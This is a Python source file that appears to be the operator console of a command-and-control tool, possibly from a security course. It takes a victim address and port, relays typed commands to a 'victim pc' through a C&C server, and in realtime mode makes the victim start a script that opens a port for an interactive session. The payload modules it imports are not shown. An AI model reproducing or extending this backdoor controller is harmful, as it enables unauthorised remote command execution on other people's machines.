#Imports required for this file
import config
import socket
import os
import subprocess
from attackerDelayed import notReal
from attackerRealTime import real

#Greeting message and syntax explanation
print("\n                            ---- WELCOME ----")
print("                syntax: 2ic80 [-r VICTIM] [-p PORT]")

#Function that asks for a new command to execute
def getCommand():
	#Receives command and splits it in order to be validated
	command = input("\n~ $: ").split()

	#Validates command and gets important variables from them
	VICTIM, PORT = checkValidityCommand(command)

	#if error ocurred, return False
	if not VICTIM and not PORT:
		return False, False, False

	#Returns variables for later use
	return VICTIM, PORT, checkRealtime(command)

#Checks whether the command indicates that realtime mode has to be enabled
def checkRealtime(command):
	if len(command) > 1 and command[1] == "-r":
		return True
	else:
		return False

#Checks whether the inputted command is valid
def checkValidityCommand(command):
	#Standard values for VICTIM and PORT
	VICTIM = "127.0.0.0"
	PORT = 1024

	#Checks if command in non-null
	if len(command) == 0:
		print("general: wrong length")
		return False, False

	#Special command indicating the application has to be closed
	if command[0] == "exit()":
		exit()

	#Checks whether the length of the command is correct based on what options are enabled
	if "-r" in command and "-p" in command and len(command) == 5:
		VICTIM = command[2]
		PORT = command[4]
	elif "-r" in command and "-p" not in command and len(command) == 3:
		VICTIM = command[2]
	elif "-r" not in command and "-p" in command and len(command) == 3:
		PORT = command[2]
	elif "-r" not in command and "-p" not in command and len(command) == 1:
		pass
	else:
		print("general: wrong length")
		return False, False

	#Checks whether PORT is of valid format
	try:
		PORT = int(PORT)
	except:
		print("-p: wrong format")
		return False, False

	#Returns variables for later use
	return VICTIM, PORT

#Checks whether the victim socket is open
def checkSocketOpen(VICTIM, PORT):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	return sock.connect_ex((VICTIM, PORT))

def main():
	#getCommand() is called to initalize variables
	VICTIM, PORT, realtime = getCommand()

	#if error ocurred, retry
	if not VICTIM and not PORT and not realtime:
		return

	#When realtime is not enabled, asks for input and relays it to the victim pc
	if realtime == False:
		action = input("enter command to relay ~ $: ")
		notReal(config.cncIP, PORT, action)

	#When realtime is enabled
	elif realtime == True:
		#Open a new terminal and make the victim pc open a port
		subprocess.run(['gnome-terminal', '-x', 'python3', 'attackerDelayed.py', config.cncIP, str(PORT), "python3 victimRealTime.py"])

		#Waits until the victim port is open
		while checkSocketOpen(VICTIM, PORT) != 0:
			pass

		#Starts a realtime connection with the victim
		if checkSocketOpen(VICTIM, PORT) == 0:
			real(VICTIM, PORT)

#Run main loop
while True:
	main()
